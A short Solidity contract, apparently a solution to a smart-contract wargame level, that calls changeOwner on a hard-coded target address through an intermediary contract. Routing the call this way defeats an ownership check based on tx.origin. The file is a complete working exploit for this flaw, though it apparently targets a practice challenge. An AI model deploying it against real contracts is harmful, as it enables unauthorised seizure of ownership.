pragma solidity ^0.4.24;

contract TelephoneInterface {
   function changeOwner(address _owner) public;
}

contract ExternalCaller{
   TelephoneInterface tele;

   constructor() public {
       tele = TelephoneInterface(0x58fe44d30255c50033b5071383466cde87dd290a);
   }

   function sendMessage(address owner) public {
       tele.changeOwner(owner);
   }
}
